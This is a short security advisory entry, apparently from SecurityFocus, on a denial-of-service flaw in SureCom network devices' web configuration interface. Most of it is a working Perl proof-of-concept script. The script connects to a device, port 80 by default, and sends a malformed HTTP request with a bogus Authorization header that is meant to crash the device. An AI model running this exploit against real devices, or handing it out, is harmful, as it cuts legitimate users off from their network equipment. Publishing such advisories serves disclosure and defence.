source: https://www.securityfocus.com/bid/9795/info

An issue in the handling of specific web requests by SureCom network devices has been identified. By placing a malformed request to the web configuration interface, it is possible for an attacker to deny service to legitimate users of a vulnerable device.

#!/usr/bin/perl


use IO::Socket;


# default settings

$server = "192.168.0.1";
$port = "80";
$http_request = "GET / HTTP/1.1\r\nAuthorization: B 00000000\r\n\r\n";

if(@ARGV == 2) {

        $server = $ARGV[0];
        $port = $ARGV[1];

}
else {

        print "Usage: ./surecom_tester [address] [port]\n\n";
        print "Using default settings...\n\n";

}

$socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>$server,
PeerPort=>$port)
  or die "ERROR: can't connect to $server on port $port\n\n";
print $socket $http_request;
$http_response = <$socket>;
print "The server's not vulnerable and replied with " . $http_response .
"\n";